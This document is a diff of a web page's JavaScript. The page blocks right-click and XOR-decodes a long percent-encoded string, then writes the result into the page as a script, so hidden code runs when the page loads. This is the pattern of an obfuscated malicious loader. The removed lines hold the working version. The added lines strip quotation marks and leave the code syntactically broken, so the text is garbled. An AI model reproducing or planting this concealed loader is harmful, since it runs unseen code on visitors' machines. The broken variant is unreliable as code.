@@ -55,7 +55,7 @@ document.onmousedown =3D norightclick;		// for all others
 </SCRIPT>
 
 <SCRIPT>
-var char_escaped=3D"%FF%FE%FD%FC%FB%FA%F9%F8%F7%F6%F5%F4%F3%F2%F1%F0%EF%EE=
+var char_escaped=3D%FF%FE%FD%FC%FB%FA%F9%F8%F7%F6%F5%F4%F3%F2%F1%F0%EF%EE=
 %ED%EC%EB%EA%E9%E8%E7%E6%E5%E4%E3%E2%E1%E0%DF%DE%DD%DC%DB%DA%D9%D8%D7%D6%D=
 5%D4%D3%D2%D1%D0%CF%CE%CD%CC%CB%CA%C9%C8%C7%C6%C5%C4%C3%C2%C1%C0%BF%BE%BD%=
 BC%BB%BA%B9%B8%B7%B6%B5%B4%B3%B2%B1%B0%AF%AE%AD%AC%AB%AA%A9%A8%A7%A6%A5%A4=
@@ -65,7 +65,7 @@ B%8A%89%88%87%86%85%84%83%82%81%80%7F%7E%7D%7C%7B%7A%79%78%77%76%75%74%73%=
 %59%58%57%56%55%54%53%52%51%50%4F%4E%4D%4C%4B%4A%49%48%47%46%45%44%43%42%4=
 1%40%3F%3E%3D%3C%3B%3A%39%38%37%36%35%34%33%32%31%30%2F%2E%2D%2C%2B%2A%29%=
 28%27%26%25%24%23%22%21%20%1F%1E%1D%1C%1B%1A%19%18%17%16%15%14%13%12%11%10=
-%0F%0E%0D%0C%0B%0A%09%08%07%06%05%04%03%02%01%00";
+%0F%0E%0D%0C%0B%0A%09%08%07%06%05%04%03%02%01%00;
 var char_all    =3D unescape( char_escaped );
 
 function bound( min_val, value, max_val )
@@ -90,9 +90,9 @@ e.
 
 function xor( data, pattern )
 { 
-   var ii =3D 0;    var jj =3D 0;  var result =3D "";  if( pattern =3D=3D =
-null || pattern =3D=3D "" || pattern.length <=3D 0 ) {       pattern =3D "=
-simple_xor_pattern";    }
+   var ii =3D 0;    var jj =3D 0;  var result =3D ;  if( pattern =3D=3D =
+null || pattern =3D=3D  || pattern.length <=3D 0 ) {       pattern =3D =
+simple_xor_pattern;    }
    for( ii =3D 0; ii < data.length; ii++ ) {
       if( jj >=3D pattern.length ) {
          jj =3D 0;
@@ -109,7 +109,7 @@ function dede( data, pattern ) {    return xor( unescape( data ), pattern =
 <SCRIPT>
 function go()
 {
-var tt=3D"";
+var tt=3D;
 
 tt=3Ddede('%AA%B8%A9%A5%BA%A4%A1%A3%EC%AA%A8%A1%A1%E5%E7%ED%B7%ED%B0%AF%A0=
 %A9%A1%BA%E2%A2%B7%A3%A0%E5%E9%A5%B8%B9%B7%FC%E1%E2%FF%F4%F4%E3%F2%E8%FF%F=
@@ -120,7 +120,7 @@ F%F1%A3%A8%EA%BD%AE%BC%A2%A0%A1%A5%A7%BC%BE%F3%B4%A9%BE%EB%B4%AB%BE%A7%B7%=
 AD%AF%AB%A3%F3%A3%A1%E1%AF%A2%B7%BF%A6%A4%BD%B9%A3%BF%BE%FB%A0%A2%E2%AB%B9=
 %A1%AB%B5%AD%BF%AB%A8%A2%EA%EE%FD%B3','32891212');
 
-document.write("<script>");
+document.write(<script>);
 document.write(tt);
 document.write('<');
 document.write('\u002F');
